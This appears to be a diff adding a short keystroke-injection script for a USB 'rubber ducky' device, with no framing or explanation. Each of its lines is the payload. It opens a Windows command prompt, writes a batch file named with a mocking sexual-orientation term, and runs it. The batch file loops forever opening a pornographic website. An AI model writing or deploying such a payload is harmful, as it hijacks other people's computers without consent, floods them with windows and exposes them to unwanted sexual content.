@@ -1,0 +1,18 @@
+DELAY 1000
+GUI r
+STRING cmd
+ENTER
+DELAY 500
+STRING copy con gay.bat
+ENTER
+STRING @echo off
+ENTER
+STRING :a
+ENTER
+STRING start www.pornhub.com/gay
+ENTER
+STRING goto a
+CONTROL z
+ENTER
+STRING gay.bat
+ENTER
